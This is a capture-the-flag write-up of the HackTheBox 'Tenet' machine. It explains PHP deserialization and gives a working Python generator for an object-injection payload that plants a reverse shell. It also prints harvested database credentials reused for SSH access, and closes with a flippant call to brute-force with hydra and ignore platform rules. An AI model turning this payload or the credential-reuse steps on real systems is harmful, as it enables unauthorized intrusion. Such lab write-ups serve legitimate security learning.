     Overview
    </h1>
    <p>
     I am completely confuddled by the ratings of HackTheBox machines lately... Besides Delivery, the latest Easy boxes should of been rated as Medium and vice versa...
    </p>
    <p>
     <em>
      Tenet was not an exception to this rule.
     </em>
    </p>
    <p>
     However, I am not gonna lie but I did really enjoy this box! The PHP deserialization attack for initial foothold was simple yet sweet. It was also noice to flex some BashFU for root as well.
    </p>
    <p>
     I will jump straight into it since this is a fairly quick box.

     Initial Foothold
    </h2>
    <p>
     Now I could of assumed that the box had a web server and SSH open, since most boxes have those ports open. Alas, I went down the conservative route and just did the usual Nmap scan.

     Like 99% of the time, the SSH port would not give me an attack vector in
     <em>
      (yet)
     </em>
     , so I visited the website at http://tenet.htb/ after adding
     <code>
      {% raw %}
  tenet.htb
 {% endraw %}
     </code>
     to my
     <code>
      {% raw %}
  /etc/hosts
 {% endraw %}
     </code>
     file.

     Seems like another boring Wordpress blog, but it looks like a certain dev called
     <code>
      {% raw %}
  neil
 {% endraw %}
     </code>
     was peeved off by the main blogger.
    </p>
    <p>
     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/poorneil.png"/>

     If you cannot see the comment from
     <code>

     </code>
     in the screenshot above, here it is.

      did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!

    <p>
     <em>
      Poor Neil and his plights as a developer.
     </em>
    </p>
    <p>
     I would of felt more sorry for Neil if he demonstrated better OP sec, but thanks to them I knew I would have to find a file called
     <code>
      {% raw %}
  sator.php
 {% endraw %}
     </code>
     (this was an educated guess).
    </p>
    <p>
     Most of you reading this know that it is good practice to add the domain of the box to
     <code>
      {% raw %}
  /etc/hosts
 {% endraw %}
     </code>
     for enumeration purposes, for an example
     <code>
      {% raw %}
  tenet.htb
 {% endraw %}
     </code>
     . What took me a solid hour to realise is that
     <em>
      just maybe
     </em>
     there is more information on the default site besides the virtual hosts...
    </p>
    <p>
     I spent over an hour fuzzing for
     <code>
      {% raw %}
  sator.php
 {% endraw %}
     </code>
     on
     <code>
      {% raw %}
  tenet.htb
 {% endraw %}
     </code>
     , when actuality it was sitting right in front of me at http://10.10.10.223/sator.php ...

      Oooo I surely do like reading about databases on the boxes I am attacking!

    </p>
    <p>
     After wasting about another hour trying to find this backup that
     <code>
      {% raw %}
  neil
 {% endraw %}
     </code>
     mentioned, I finally found the backup of
     <code>
      {% raw %}
  sator.php
 {% endraw %}
     </code>
     at http://10.10.10.223/sator.php.bak. If you didn't know this beforehand, the
     <code>
      {% raw %}
  .bak
 {% endraw %}
     </code>
     extension is commonly used on Linux boxes for backup files; which I did forget about for a bit.

     <em>
      This code looks ripe for a good old PHP deserialization attack!
     </em>
    </p>
    <p>
     What is PHP serialization you might ask?
     <s>
      If you know about it just skip a bit.
     </s>
    </p>
    <p>
     Well, the simplified question is how do you send the state of an instance of a class in Object Oriented Programming (OOP) languages? In PHP, this is done by expressing the state of the instance as a formatted string.
    </p>
    <p>
     Alright hear me out, let us use the code of
     <code>
      {% raw %}
  sator.php
 {% endraw %}
     </code>
     as an example and get the serialized string of the
     <code>
      {% raw %}
  $app
 {% endraw %}
     </code>
     instance of
     <code>
      {% raw %}
  DatabaseExport
 {% endraw %}
     </code>
     using the below code snippet.
    </p>
    <p>
     <em>
      payload_gen.php
     </em>
    </p>
    <pre class="codehilite"><code>{% raw %}&lt;?php

class DatabaseExport
{
    public $user_file = 'users.txt';
    public $data = '';

    public function update_db()
    {
        $this-&gt; data = 'Success';
    }


    public function __destruct()
    {
        file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);
    //  echo 'Gotta get this working properly...';
    }
}

$app = new DatabaseExport;
$app -&gt; update_db();

echo serialize($app)."\n";

?&gt;
{% endraw %}</code></pre>
    <pre class="codehilite"><code>{% raw %}ghostccamm@kali:~/Desktop/hackthebox/machines/tenet/get_init$ php payload_gen.php
O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"users.txt";s:4:"data";s:7:"Success";}
{% endraw %}</code></pre>
    <p>
     So we can now see how the objects of the
     <code>
      {% raw %}
  DatabaseExport
 {% endraw %}
     </code>
     class are serialized.
    </p>
    <ul>
     <li>
      The 'O' at the start is to signal that the serialized string is an Object of a class.
     </li>
     <li>
      The '14' is the number of letters in the name of the Class that the Object is an instance of. In this case it is
      <code>
       {% raw %}
   DatabaseExport
  {% endraw %}
      </code>
      .
     </li>
     <li>
      The '2' is the number of properties that the object has.
     </li>
    </ul>
    <p>
     The following '
     <code>
      {% raw %}
  {}
 {% endraw %}
     </code>
     ' block then expresses the names of the properties and the values of them as well. So for the
     <code>
      {% raw %}
  user_file
 {% endraw %}
     </code>
     property of
     <code>
      {% raw %}
  $app
 {% endraw %}
     </code>
     , the name of the property is a string (
     <code>
      {% raw %}
  s
 {% endraw %}
     </code>
     ) and is 9 characters and its value is also string.
    </p>
    <p>
     Still confused? You probably are since I only gave a brief introduction on PHP object serialization. Check out this
     <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">
      Medium Article by Vickie Li
     </a>
     where she went into far greater detail about PHP serialization and how you can exploit it.
    </p>
    <p>
     Getting back to Tenet now, we can modify the
     <code>
      {% raw %}
  user_file
 {% endraw %}
     </code>
     and
     <code>
      {% raw %}
  data
 {% endraw %}
     </code>
     properties from the serialized string we send using the GET parameter
     <code>
      {% raw %}
  arepo
 {% endraw %}
     </code>
     .
    </p>
    <p>
     <strong>
      This means that we can save a PHP file onto the webserver!
     </strong>
    </p>
    <p>
     I wrote a neat little Python script that will construct the payload that I will send to the server. The serialized string needed to be URL encoded as well, since it is sent as a GET parameter in the URL.
    </p>
    <pre class="codehilite"><code>{% raw %}import sys, urllib.parse

def main(filename):
    lines = []

    data = ""

    for line in sys.stdin:
        data = data + line

    payload = 'O:14:"DatabaseExport":2:{{s:9:"user_file";s:{}:"{}";s:4:"data";s:{}:"{}";}}'.format(len(filename), filename, len(data), data)

    print(urllib.parse.quote_plus(payload))


if __name__ == "__main__":
    try:
        filename = sys.argv[1]
    except:
        print("You need to give a file name!")
        sys.exit(1)

    main(filename)
{% endraw %}</code></pre>
    <p>
     I then just piped the
     <code>
      {% raw %}
  php-reverse-shell.php
 {% endraw %}
     </code>
     file that comes pre-packaged with Kali Linux as my payload and uploaded it onto the box.
    </p>
    <p>
     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/exploit.png"/>
    </p>
    <p>
     Now chucking that payload into the
     <code>
      {% raw %}
  http://10.10.10.223/sator.php?arepo=&lt;payload here&gt;
 {% endraw %}
     </code>
     , I was able to upload my reverse shell and get initial foothold!

    <p>
     Well after all of this talk about databases, I decided to look for some database credentials. Heading over to
     <code>
      {% raw %}
  /var/www/html/wordpress/wp-config.php
 {% endraw %}
     </code>
     I found what I was looking for.
    </p>
    <pre class="codehilite"><code>{% raw %}$ cat /var/www/html/wordpress/wp-config.php
&lt;?php

 * This file contains the following configurations:

// ** MySQL settings - You can get this info from your web host ** //

/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );
{% endraw %}</code></pre>
    <p>
     Now I would normally check the contents of the database first, but for some reason I decided to see if I could login as
     <code>
      {% raw %}
  neil
 {% endraw %}
     </code>
     with the password "Opera2112" (oh by the way he is a user on the box).
    </p>
    <p>
     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/dbpass.png"/>
    </p>
    <p>
     <strong>
      Lo and behold! I got neil's account!
     </strong>
    </p>
    <p>
     To be honest, I felt like wasted all that time with the enumeration and PHP serialization attack that I did earlier where I could of easily bruteforced neil's password with a good educated guess of the password...
    </p>
    <p>
     <em>
      Like "Opera" is literally in the icon for the box...

    <p>
     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/tenet.png"/>
    </p>
    <p>
     Oh well... I learnt the lesson to always blast boxes with
     <code>
      {% raw %}
  hydra
 {% endraw %}
     </code>
     and ignore HackTheBox rules. I assume some script kiddie out there was pretty darn happy that for the first time ever bruteforcing SSH works from the very start (if they had a big enough brain to make a good enough wordlist).
